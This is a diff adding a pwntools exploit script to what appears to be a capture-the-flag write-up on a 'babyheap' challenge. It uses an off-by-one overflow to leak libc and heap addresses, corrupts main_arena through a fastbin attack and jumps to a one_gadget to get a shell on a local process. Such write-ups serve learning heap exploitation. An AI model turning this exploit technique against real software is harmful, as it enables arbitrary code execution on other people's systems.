@@ -74,6 +74,74 @@ Top Chunk
 exp：
 
 ```
+from pwn import *
+import sys
+
+def alloc(size):
+	r.recvuntil("Command: ")
+	r.sendline("1")
+	r.recvuntil("Size: ")
+	r.sendline(str(size))
+
+def update(idx,size,content):
+	r.recvuntil("Command: ")
+	r.sendline("2")
+	r.recvuntil("Index: ")
+	r.sendline(str(idx))
+	r.recvuntil("Size: ")
+	r.sendline(str(size))
+	r.recvuntil("Content: ")
+	r.sendline(content)
+
+def delete(idx):
+	r.recvuntil("Command: ")
+	r.sendline("3")
+	r.recvuntil("Index: ")
+	r.sendline(str(idx))
+
+def view(idx):
+	r.recvuntil("Command: ")
+	r.sendline("4")
+	r.recvuntil("Index: ")
+	r.sendline(str(idx))
+
+def exploit(r):
+	alloc(0x48)
+	alloc(0x48)
+	alloc(0x48)
+	#chunk3 meiyou hui  shibai
+	alloc(0x48)
+	update(0, 0x49, 'a'*0x48 + "\xa1")
+	delete(1)
+	alloc(0x48)
+	view(2)
+	r.recvuntil("Chunk[2]: ")
+	main_arena = u64(r.recv(8))-0x58
+	libc_adr = main_arena-0x39bb20
+	print hex(libc_adr)
+	alloc(0x48)   # 4 = 2
+	delete(1)
+	delete(2)
+	view(4)
+	r.recvuntil("Chunk[4]: ")
+	heap = u64(r.recv(8))-0x50
+	alloc(0x58)
+	delete(1)
+	update(4, 8, p64(main_arena + 37))
+	alloc(0x48)
+	alloc(0x40)
+	update(2,0x2c,"\x00"*35+p64(main_arena-0x33))
+	alloc(0x20)
+	update(5,28,'a'*11 + p64(libc_adr+0x4526a)*2)
+	alloc(22)
+	r.interactive()
+	return
+
+r = process('./babyheap')
+print util.proc.pidof(r)
+pause()
+exploit(r)
+
 
 ```
 
